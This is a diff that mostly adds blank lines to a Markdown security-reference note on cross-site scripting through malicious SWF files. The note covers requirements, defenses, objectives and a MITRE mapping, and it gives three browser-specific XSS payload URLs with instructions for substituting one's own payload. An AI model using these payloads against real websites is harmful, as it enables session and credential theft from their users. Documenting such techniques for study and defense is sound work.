@@ -37,11 +37,15 @@ Technical Explanation: The attacker creates a SWF file that contains malicious c
 
 Business Value: This attack can result in the theft of sensitive information, such as user credentials, credit card numbers, and other personal information. It can also result in financial loss for the victim if the attacker uses the stolen information to make unauthorized purchases.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application or the ability to trick the user into visiting a website that contains the malicious SWF file.
 
 1. Knowledge of SWF file format and how to inject malicious code into it.
+
+ 
 
 ## Defense
 
@@ -51,19 +55,31 @@ Business Value: This attack can result in the theft of sensitive information, su
 
 1. Regularly update and patch web applications to ensure that known vulnerabilities are addressed.
 
+ 
+
 ## Objectives
 
 1. To inject and execute malicious code in a SWF file that can be used to steal sensitive information from the user or perform actions on the user's behalf.
 
 1. To gain unauthorized access to a web application by exploiting a vulnerability that allows the attacker to upload a malicious SWF file.
 
+ 
+
 # Instructions
 
 1. This command is used to perform an XSS (Cross-Site Scripting) attack on a target website. The 'data' field contains URLs for different browsers that can be used to execute the attack. The 'explain' field provides more details on how to use these URLs.
 
+ 
+
+
+
 **Code**: [[Browsers other than IE: http://0me.me/demo/xss/xss]]
 
+
+
 > For browsers other than IE, use the URL provided in the 'data' field and replace the 'alert(document.domain);' part with your own payload. For IE8, use the URL provided in the 'data' field and replace the 'alert(document.domain)' part with your own payload. If the payload throws an error, the browser will redirect to the previous page. For IE9, use the URL provided in the 'data' field and replace 'invalidfileinvalidfileinvalidfile' with your own payload. The payload will open a new window and then close it after 1ms, triggering the 'alert' function with the URL of the new window. Note that XSS attacks can be illegal and should only be performed on websites with permission from the owner.
+
+
 
 **Command** ([[XSS demo on browsers other than IE]]):
 
@@ -71,17 +87,27 @@ Business Value: This attack can result in the theft of sensitive information, su
 http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 ```
 
+
+
+
+
 **Command** ([[XSS demo on IE8]]):
 
 ```bash
 http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
 ```
 
+
+
+
+
 **Command** ([[XSS demo on IE9]]):
 
 ```bash
 http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -105,3 +131,5 @@ http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfile
 - [[Cross Site Scripting]]
 - [[XSS in files]]
 - [[XSS in SWF flash application]]
+
+
